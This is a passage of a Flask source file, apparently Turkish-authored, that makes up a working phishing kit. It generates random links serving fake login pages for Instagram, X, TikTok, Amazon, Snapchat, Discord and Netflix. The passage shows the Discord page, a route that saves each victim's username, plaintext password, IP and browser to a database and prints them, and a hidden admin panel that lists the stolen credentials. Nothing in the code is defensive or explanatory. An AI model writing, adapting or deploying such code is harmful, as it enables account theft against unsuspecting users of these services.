  width: 100%;
  padding: 10px;
  margin: 10px 0;
  background: #202225;
  border: none;
  color: white;
}
button {
  width: 100%;
  padding: 10px;
  background: #5865f2;
  border: none;
  color: white;
  font-weight: bold;
}
</style>
<body>
  <div class="login-box">
    <h2>Welcome back!</h2>
    <p>We're so excited to see you again!</p>
    <form method="post" action="/post/discord">
      <label>Email or Phone Number</label>
      <input type="text" name="username" required>
      <label>Password</label>
      <input type="password" name="password" required>
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>

'''

ADMIN_HTML = '''
<!DOCTYPE html>
<html lang="tr">
<head>
  
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Paneli</title>
    <link rel="icon" href="IPL.png" type="image/png" sizes="16x16">
    <link rel="icon" href="IPL.png" type="image/png" sizes="32x32">
    <link rel="apple-touch-icon" href="IPL.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f8f9fa;
            padding-top: 2rem;
        }
        .card {
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 2rem;
        }
        .card-header {
            background-color: #343a40;
            color: white;
            border-radius: 15px 15px 0 0 !important;
        }
        .table-responsive {
            border-radius: 0 0 15px 15px;
            overflow: hidden;
        }
        .table {
            margin-bottom: 0;
        }
        .table th {
            background-color: #f1f1f1;
            position: sticky;
            top: 0;
        }
        .badge {
            font-size: 0.9em;
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6c757d;
        }
        .stats-card {
            border-left: 4px solid #0d6efd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row mb-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <h4 class="mb-0"><i class="fas fa-tachometer-alt me-2"></i>Admin Paneli - İstatistikler</h4>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-4 mb-3">
                                <div class="card h-100 stats-card">
                                    <div class="card-body">
                                        <h5 class="card-title">Toplam Link</h5>
                                        <h2 class="card-text">{{ links_count }}</h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4 mb-3">
                                <div class="card h-100 stats-card">
                                    <div class="card-body">
                                        <h5 class="card-title">Toplam Giriş</h5>
                                        <h2 class="card-text">{{ visitors_count }}</h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4 mb-3">
                                <div class="card h-100 stats-card">
                                    <div class="card-body">
                                        <h5 class="card-title">Son Giriş</h5>
                                        <h6 class="card-text">{{ last_visitor_time }}</h6>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <h4 class="mb-0"><i class="fas fa-list me-2"></i>Giriş Yapılan Kayıtlar</h4>
                    </div>
                    <div class="table-responsive">
                        <table class="table table-striped table-hover">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>IP</th>
                                    <th>Kullanıcı Adı</th>
                                    <th>Şifre</th>
                                    <th>Link ID</th>
                                    <th>Tarayıcı</th>
                                    <th>Zaman</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for v in visitors %}
                                <tr>
                                    <td>{{ v.id }}</td>
                                    <td>{{ v.ip }}</td>
                                    <td>{{ v.username }}</td>
                                    <td>{{ v.password }}</td>
                                    <td>{{ v.link_id }}</td>
                                    <td>{{ v.user_agent[:50] }}...</td>
                                    <td>{{ v.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td>
                                </tr>
                                {% else %}
                                <tr>
                                    <td colspan="7" class="text-center py-4">
                                        <div class="empty-state">
                                            <i class="fas fa-exclamation-circle fa-2x mb-3"></i>
                                            <p>Henüz giriş yapılmadı.</p>
                                        </div>
                                    </td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Tabloyu yenile butonu eklenebilir
        // Bu fonksiyon sayfada tanımlı olmalı
function copyToClipboard(text) {
  navigator.clipboard.writeText(text)
    .then(() => alert('Kopyalandı: ' + text))
    .catch(err => console.error('Kopyalama hatası:', err));
}
    </script>
</body>
</html>
'''

# Routes

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        site = request.form.get("site")
        if not site:
            return redirect(url_for("home"))
        # Rastgele link oluştur ve DB'ye kaydet
        rand_path = random_string(10)
        new_link = Link(site=site, random_path=rand_path)
        db.session.add(new_link)
        db.session.commit()
        return redirect(url_for("home"))
    links = Link.query.order_by(Link.created_at.desc()).all()
    base_url = f"http://{get_public_ip()}:5000"
    return render_template_string(HOME_HTML, links=links, base_url=base_url, admin_path=SECRET_ADMIN_PATH)

@app.route("/site/<random_path>", methods=["GET"])
def show_site(random_path):
    link = Link.query.filter_by(random_path=random_path).first_or_404()
    if link.site == "instagram":
        return render_template_string(INSTAGRAM_HTML, random_path=random_path)
    elif link.site == "x":
        return render_template_string(X_HTML, random_path=random_path)
    elif link.site == "tiktok":
        return render_template_string(TIKTOK_HTML, random_path=random_path)
    elif link.site == "amazon":
        return render_template_string(AMAZON_HTML, random_path=random_path)
    elif link.site == "snapchat":
        return render_template_string(SNAPCHAT_HTML, random_path=random_path)
    elif link.site == "discord":
        return render_template_string(DISCORD_HTML, random_path=random_path)
    elif link.site == "netflix":
        return render_template_string(NETFLIX_HTML, random_path=random_path)
    else:
        return "Site desteklenmiyor", 404

@app.route("/login/<random_path>", methods=["POST"])
def login(random_path):
    link = Link.query.filter_by(random_path=random_path).first_or_404()
    username = request.form.get("username")
    password = request.form.get("password")
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")

    # Visitor kaydını oluştur
    new_visitor = Visitor(
        ip=ip,
        username=username,
        password=password,
        link_id=link.id,
        user_agent=user_agent
    )
    db.session.add(new_visitor)
    db.session.commit()

    print(f"[{datetime.utcnow()}] IP: {ip} - UA: {user_agent} - Username: {username} - Password: {password} - LinkID: {random_path}")
    return render_template_string(SUCCESS_HTML)

@app.route(f"/admin/{SECRET_ADMIN_PATH}")
def admin():
    visitors = Visitor.query.order_by(Visitor.timestamp.desc()).all()
    links_count = Link.query.count()
    visitors_count = Visitor.query.count()
    last_visitor = Visitor.query.order_by(Visitor.timestamp.desc()).first()
    last_visitor_time = last_visitor.timestamp.strftime('%Y-%m-%d %H:%M:%S') if last_visitor else "Kayıt yok"

    return render_template_string(
        ADMIN_HTML,
        visitors=visitors,
        links_count=links_count,
        visitors_count=visitors_count,
        last_visitor_time=last_visitor_time
    )

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    public_ip = get_public_ip()  # Otomatik IP algılama
    print(f"\nUygulama adresi: http://{public_ip}:5000")
    print(f"Admin paneli: http://{public_ip}:5000/admin/{SECRET_ADMIN_PATH}\n")
    app.run(host="0.0.0.0", port=5000, debug=False)  # debug=False production'da
